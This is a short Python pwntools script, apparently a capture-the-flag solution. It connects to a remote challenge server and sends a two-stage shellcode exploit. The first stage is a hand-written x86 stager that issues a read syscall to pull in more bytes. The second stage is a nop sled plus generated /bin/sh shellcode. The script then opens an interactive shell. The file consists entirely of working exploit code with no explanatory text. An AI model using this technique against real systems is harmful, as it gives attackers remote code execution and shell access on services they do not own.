from pwn import * 

context.log_level = 'DEBUG'

io = remote('0.cloud.chals.io', 20922)


payload_read =  (b'\x90' * 6  + 
            b'\xB0\x03' +
            b'\x90' * 4 + 
            b'\xB2\xFF' + 
            b'\xCD\x80'+ 
            b'\xEB\xEE' 
       
)


io.send(payload_read)

payload_execve = (
        b'\x90' * 16 +
         asm(shellcraft.sh()) 
)

io.send(payload_execve)

io.interactive()